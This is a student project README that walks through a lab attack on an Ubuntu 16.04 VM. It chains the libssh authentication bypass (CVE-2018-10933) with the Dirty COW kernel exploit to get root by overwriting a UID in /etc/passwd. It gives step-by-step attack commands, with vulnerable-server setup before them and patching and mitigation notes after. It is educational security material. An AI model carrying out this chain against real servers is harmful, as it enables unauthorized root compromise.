# Multi-Stage Attack on a Linux Server

This project demonstrates a multi-stage attack on a Linux server, combining two distinct vulnerabilities to achieve a full system compromise. The attack first gains initial access by exploiting an authentication bypass in a vulnerable `libssh` library and then escalates privileges to root using the "Dirty COW" kernel exploit.

This repository is for educational and research purposes only. Do not attempt to replicate these attacks on any system without explicit permission.

## Table of Contents
- [Vulnerabilities Exploited](#vulnerabilities-exploited)
- [Project Structure](#project-structure)
- [Setting Up the Vulnerable Server](#setting-up-the-vulnerable-server)
- [Executing the Attack](#executing-the-attack)
- [Patching and Mitigation](#patching-and-mitigation)
- [Authors](#authors)
- [References](#references)

## Vulnerabilities Exploited

### 1. libssh Authentication Bypass (CVE-2018-10933)
This critical vulnerability exists in `libssh` versions 0.6 to 0.7.5. An attacker can bypass the authentication process entirely by sending a specially crafted `SSH2_MSG_USERAUTH_SUCCESS` message to the server. The vulnerable server code mistakes this for a successful authentication and grants the attacker shell access without requiring any credentials.

- **Impact:** Remote Code Execution (as a low-privilege user).
- **CVSS Score:** 9.1 (Critical)

### 2. Dirty COW Privilege Escalation (CVE-2016-5195)
Dirty COW is a race condition in the Linux kernel's memory management subsystem (specifically, the Copy-On-Write mechanism). It allows a local user to gain write access to read-only memory mappings. This can be exploited to overwrite critical files, such as `/etc/passwd`, to grant root privileges to a local user account.

- **Impact:** Privilege Escalation to root.
- **CVSS Score:** 7.8 (High)

## Project Structure

This repository is organized into the following directories:

- **`/code`**: Contains all the source code for the project.
  - `ssh_exploit.py`: A Python script to perform the libssh authentication bypass.
  - `samplesshd-cb.c`: The vulnerable `libssh` example server code.
  - `samplesshd-cb-patched.c`: The patched server code that prevents the bypass.
  - `CMakeLists.txt`: The build configuration file for the server examples.
- **`/docs`**: Contains the project documentation.
  - `Cybersecurity_Report.pdf`: The detailed final project report.
  - `Cybersecurity_Project_Proposal.pdf`: The initial project proposal.
- **`/presentation`**: Contains the project presentation and a video demonstration.
  - `Cybersecurity_Presentation.pdf`: The project presentation slides.
  - `Demo.mp4`: A video demonstrating the multi-stage attack.

## Setting Up the Vulnerable Server

To replicate the environment, follow these steps as detailed in the project report.

**1. Install a Vulnerable OS**
- Set up a virtual machine with **Ubuntu 16.04**. You can download an old release from the official Ubuntu archives.
- **Alternatively**, you can download a pre-configured VMware virtual machine from the following link to simplify the setup process: [Ubuntu 16.04 Vulnerable VM](https://drive.google.com/file/d/1KbMlIb7Fg7Kh1hF-EmPs4h3zcTJzmyir/view?usp=share_link).
  *(Note: This VM was created with VMware and is most likely to work with VMware products. The user credentials are `ubuntu` with the password `ubuntu`.)*

**2. Install Build Dependencies**
- Open a terminal and install the necessary tools to compile `libssh`.
  ```bash
  sudo apt-get update
  sudo apt-get install -y build-essential cmake libssl-dev zlib1g-dev libgcrypt20-dev libkrb5-dev libcurl4-openssl-dev pkg-config
  ```

**3. Download and Prepare Vulnerable libssh**
- Download a vulnerable version of `libssh` (e.g., 0.7.4).
  ```bash
  wget https://www.libssh.org/files/0.7/libssh-0.7.4.tar.xz --no-check-certificate
  tar xvf libssh-0.7.4.tar.xz
  cd libssh-0.7.4
  ```

**4. Prepare the Server Code**
- Create a build directory.
  ```bash
  mkdir build && cd build
  ```
- Copy the provided `samplesshd-cb.c` and `CMakeLists.txt` from the `/code` directory into the `libssh-0.7.4/examples/` directory, overwriting the existing files. Also place `samplesshd-cb-patched.c` in the same directory.

**5. Generate Server Host Keys**
```bash
sudo ssh-keygen -t dsa -m PEM -b 1024 -f /etc/ssh/ssh_host_dsa_key -N ""
sudo ssh-keygen -t rsa -m PEM -b 2048 -f /etc/ssh/ssh_host_rsa_key -N ""
sudo chmod 600 /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key
```

**6. Create a Low-Privilege User**
- This user will be the initial target, mimicking an employee account.
```bash
sudo adduser --disabled-password --shell /bin/sh sandbox
sudo mkdir -p /srv/sandbox-work
sudo chown sandbox:sandbox /srv/sandbox-work
sudo chmod 0750 /srv/sandbox-work
```

**7. Compile and Install libssh**
- From the `build` directory you created:
  ```bash
  cmake .. -DWITH_SERVER=ON -DBUILD_EXAMPLES=ON -DCMAKE_INSTALL_PREFIX=/usr/local/libssh-0.7.4
  make -j$(nproc)
  sudo make install
  ```

**8. Run the Vulnerable Server**
- You can now start the server, which will listen on port 2222.
  ```bash
  sudo ./examples/samplesshd-cb -p 2222
  ```
The server is now running and susceptible to the attack.

## Executing the Attack

### Stage 1: Gain Initial Access (libssh Exploit)
- On your attacker machine, run the `ssh_exploit.py` script from the `/code` directory, targeting the VM's IP address. The script defaults to port 2222.
  ```bash
  python ssh_exploit.py --host <VM_IP_ADDRESS>
  ```
- If successful, you will be granted an interactive shell on the server as the `sandbox` user.

### Stage 2: Escalate to Root (Dirty COW)
1.  **Get the Exploit:** Inside the `sandbox` shell, you will need the Dirty COW exploit C file. The exploit used for this project can be found in the [References](#references) section.
2.  **Find UID Offset:** Find the offset of the `sandbox` user's UID in `/etc/passwd`.
    ```sh
    # In the compromised shell
    cat /etc/passwd | grep -b sandbox
    # Example output: 2244:sandbox:x:1001:1001:,,,:/home/userx:/bin/bash
    # The UID '1001' starts after the username and two colons. Calculate the offset (here 10).
    ```
3.  **Modify and Compile:** Edit the Dirty COW exploit code to target `/etc/passwd` and use the calculated offset to overwrite the user ID with `0000`. Compile it using `gcc`.
    ```sh
    gcc -o dirty_exploit dirty.c -lpthread
    ```
4.  **Execute:** Run the compiled exploit.
    ```sh
    ./dirty_exploit
    ```
5.  **Gain Root:** After a few moments, interrupt the exploit (Ctrl+C). The `sandbox` user's ID in `/etc/passwd` has now been changed to `0000`. To gain root privileges, you must restart the SSH session.
    ```sh
    # Exit the current compromised shell
    exit

    # Rerun the exploit to start a new session
    python ssh_exploit.py --host <VM_IP_ADDRESS>

    # Verify you are now root
    whoami
    # Output should be: root
    ```
The system is now fully compromised.

## Patching and Mitigation

### Patching the libssh Bypass
The `samplesshd-cb-patched.c` file contains a manual patch. The logic is modified to require a state variable `authenticated` to be explicitly set to `1` by the `auth_password` callback function. Without this, even if libssh is tricked, the server's main loop will not proceed to grant a shell.

The provided `CMakeLists.txt` compiles both the vulnerable (`samplesshd-cb`) and the patched (`samplesshd-cb-patched`) server executables. To run the secure, patched version, execute the following command:

```bash
sudo ./examples/samplesshd-cb-patched -p 2222
```

### Mitigating Dirty COW
Since Dirty COW is a kernel-level bug, the proper fix is to update the kernel. However, without patching, mitigation can be achieved through hardening:
- **Remove Compilers:** Uninstalling `gcc` and other development tools makes it harder for an attacker to compile exploit code directly on the server.
- **Enforce No-Execute:** Mount user-writable directories with the `noexec` flag to prevent the execution of any uploaded or created binaries.

## Authors
- **Jan Büchele**
- **Henrik Lümkemann**

## References
- **Dirty COW Exploit:** The C code for the exploit can be found at this GitHub repository: [https://github.com/thaddeuspearson/Understanding_DirtyCOW](https://github.com/thaddeuspearson/Understanding_DirtyCOW)
